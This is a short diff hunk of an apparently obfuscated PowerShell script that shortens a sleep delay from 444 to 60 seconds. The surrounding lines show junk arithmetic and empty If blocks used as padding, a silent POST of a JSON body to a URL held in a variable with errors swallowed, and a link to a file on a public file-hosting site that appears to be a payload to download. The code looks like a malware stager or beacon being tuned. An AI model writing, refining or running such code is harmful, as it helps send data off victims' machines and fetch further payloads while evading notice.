@@ -80,7 +80,7 @@ If($v18>0){}
 try{$v19=Invoke-RestMethod -Uri $v14 -Method Post -ContentType "application/json; charset=utf-8" -Body $v17}catch{}
 $v20=3*4-2
 If($v20>0){}
-Start-Sleep -Seconds 444
+Start-Sleep -Seconds 60
 $v21=6*2-3
 If($v21>0){}
 $v22="https://www.udrop.com/file/Oqsm/1446062403_house.delete"
